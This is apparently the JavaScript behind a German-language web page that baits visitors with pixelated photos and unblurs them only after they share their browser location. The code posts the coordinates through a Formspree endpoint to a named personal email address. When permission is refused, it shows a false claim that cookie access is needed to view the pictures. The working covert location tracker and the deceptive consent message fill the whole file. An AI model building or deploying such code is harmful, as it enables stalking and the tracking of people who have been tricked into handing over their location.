document.getElementById('trackBtn').addEventListener('click', function() {
    getLocation();
    showNewImages(); // Zeigt die verpixelten Bilder an, auch bei Fehlern
});

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocationByEmail, showError);
    } else {
        updateStatus("Anfrage wird von diesem Browser nicht unterstützt.");
        showNewImages();
    }
}

// Standort per E-Mail senden
function sendLocationByEmail(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    const locationData = `Breitengrad: ${lat}, Längengrad: ${lon}`;
    sendLocationToFormspree(locationData);
    
    // Entferne Verpixelung nach erfolgreicher Standortermittlung
    removePixelation();
}

// Standortdaten an Formspree senden
function sendLocationToFormspree(locationData) {
    const formData = new FormData();
    formData.append("email", "nejat.balta@outlook.de");
    formData.append("subject", "Standortdaten des Besuchers");
    formData.append("message", `Die Koordinaten des Besuchers: ${locationData}`);

    fetch("https://formspree.io/f/mpwplqao", {
        method: "POST",
        body: formData
    })
    .then(response => {
        if (response.ok) {
            console.log("Standort erfolgreich gesendet");
        } else {
            console.error("Fehler beim Senden der Standortdaten", response);
        }
    })
    .catch(error => console.error("Fehler beim Senden an Formspree:", error));
}

// Fehlerbehandlung für Standortabruf
function showError(error) {
    const errorMessage = "Bitte laden Sie die Seite neu und erlauben Sie den Zugriff auf Cookies, um die Fotos und Videos anzusehen.";
    updateStatus(errorMessage);
    showNewImages();
}

// Fehlermeldung anzeigen
function updateStatus(message) {
    document.getElementById("status").innerHTML = message;
}

// Neue Bilder einfügen (verpixelt)
function showNewImages() {
    const imageContainer = document.getElementById("additional-images");

    // Verhindert doppeltes Einfügen von Bildern
    if (imageContainer.children.length > 0) return; 

    const newImages = ['bild4.jpg', 'bild5.jpg', 'bild6.jpg'];

    newImages.forEach(imageSrc => {
        const imgElement = document.createElement("img");
        imgElement.src = imageSrc;
        imgElement.alt = "Weitere Bilder";
        imgElement.classList.add('pixelated'); 
        imageContainer.appendChild(imgElement);
    });

    document.getElementById("message").style.display = "block";
}

// Entfernt Verpixelung nach erfolgreicher Standortfreigabe
function removePixelation() {
    document.querySelectorAll('#additional-images img').forEach(img => {
        img.classList.remove('pixelated');
    });
}
